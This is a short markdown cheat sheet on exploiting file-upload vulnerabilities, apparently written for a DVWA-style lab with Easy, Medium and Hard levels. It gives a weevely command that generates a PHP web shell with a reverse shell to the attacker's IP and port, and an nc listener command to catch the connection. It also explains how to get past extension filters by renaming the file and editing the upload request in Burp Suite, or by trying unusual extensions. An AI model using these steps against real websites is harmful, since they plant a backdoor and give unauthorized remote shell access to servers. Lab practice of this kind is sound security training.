#### Requirement :
if website allows to upload any type of file like profile picture or something it may be vulnerable

#### Setting up weevely :
in terminal :
```c
weevely generate (password) (shell69.php) --revshell (your_IP) (your_port)
```
#### Executing Exploit :
Upload the file (shell69.php) and try loading the file in your browser by sending it a request
listen to the connection :
```bash
nc -lvnp <your_port>
```
#### Levels of Protection :

<span style="color: green;">Easy</span> : There is no filter so the file gets uploaded

<span style="color: orange;">Medium</span> : There is a filter to check the extension so first change the file extension to ***.jpeg*** and then use Burp Suite, intercept request and  change it back to ***.php***

<span style="color: red;">Hard</span> : The filter used to strong so try to use other weird extensions like [here](https://github.com/imran-parray/Web-Sec-CheatSheet/blob/master/File-Upload-test.txt)
